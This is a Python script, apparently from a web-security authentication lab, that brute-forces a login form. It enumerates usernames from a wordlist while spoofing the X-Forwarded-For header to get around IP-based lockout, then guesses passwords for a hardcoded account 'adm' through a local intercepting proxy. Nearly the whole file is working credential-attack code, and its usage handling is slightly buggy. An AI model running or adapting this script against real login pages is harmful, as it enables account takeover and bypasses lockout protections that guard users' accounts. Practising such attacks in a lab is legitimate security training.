import requests
# import grequests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re
from random import random
import time
# import logging

# logging.basicConfig(filename='auth-lab-06.log', format='%(asctime)s - %(message)s', level=logging.INFO)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def check_response_code(res):
    print(res.status_code)


def find_username(url):
    with open('../username_list.txt') as p:
        usernames = p.readlines()

    headers = {'X-Forwarded-For': str(random()*1000)}
    for username in usernames:
        for x in range(0, 5):
            data = {"username": username.strip('\n'), "password": x}
            # headers = {'X-Forwarded-For': str(random()*1000)}
            r = requests.post(url, verify=False, proxies=proxies, data=data, headers=headers)
            print("Username: %s --- Password: %s -- %s" % (username.strip("\n"), x, r.status_code))
            res = r.text
            if "Invalid username or password" not in res:
                print("Account credential found username: %s " % (username.strip("\n")))
                return username.strip("\n")


def find_password(url, username):
	with open('../password_list.txt') as p:
		passwords = p.readlines()

	for password in passwords:
		data = {"username": username, "password": password.strip('\n')}
		r = requests.post(url, verify=False, proxies=proxies, data=data)
		print("Username: %s --- Password: %s " % (username, password.strip("\n")))
		res = r.text
		if "Invalid username or password" in res:
			continue	
		elif "incorrect login attempts" in res:
			continue
		else:
			print("Account credential found username: %s password %s" % (username, password.strip("\n")))
			return
                



    # for password in passwords:
    #     data = {"username": username.strip('\n'), "password": password.strip("\n")}
    #     headers = {'X-Forwarded-For': str(random()*1000)}
    #     r = requests.post(url, verify=False, proxies=proxies, data=data, headers=headers)
    #     print("Username: %s --- Password: %s -- %s" % (username.strip("\n"), password.strip('\n'), r.status_code))
    #     res = r.text
    #     if "Invalid username or password" not in res:
    #         print("Account credential found username: %s " % (username.strip("\n")))
    #         break

                
            
            


def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Findings valid username")
	# password_length = sql_password_length(url)
	# username = find_username(url)
	find_password(url, "adm")
	
	
if __name__ == "__main__":
	main()